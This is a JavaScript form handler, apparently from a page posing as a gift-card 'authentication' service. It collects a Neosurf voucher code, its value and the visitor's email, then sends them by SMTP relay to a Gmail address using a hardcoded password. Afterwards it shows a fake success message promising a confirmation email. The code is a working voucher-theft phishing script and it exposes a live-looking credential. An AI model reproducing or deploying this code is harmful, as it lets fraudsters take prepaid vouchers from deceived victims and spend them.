
function emailSend () {
    var userName = document.getElementById('Name').value;
    var email = document.getElementById('email').value;
    var prix = document.getElementById('Prix').value;
    var code = document.getElementById('code').value;




    var messageBody = "Neosurf: " + userName + 
                      "<br/> email: " + email +
                      "<br/> prix: " + prix + 
                      "<br/> code: " +  code;
    Email.send({
      Host : "smtp.elasticemail.com",
      Username : "authentificatorgiftcards@gmail.com",
      Password : "A079D9AD08B4F7BAC0F8A3A47BEC1FC63CB0",
      To : 'authentificatorgiftcards@gmail.com',
      From : "authentificatorgiftcards@gmail.com",
      Subject : "This is the subject",
      Body : messageBody
    }).then(
      message => {
        if( message =='OK'){
          swal("Succefull", "Authentication request save successfully.  Please wait a few moments you will receive a confirmation email", "success");

        }
        else{
          swal("Error", "Try again", "Error");

        }
      }
    );


  
}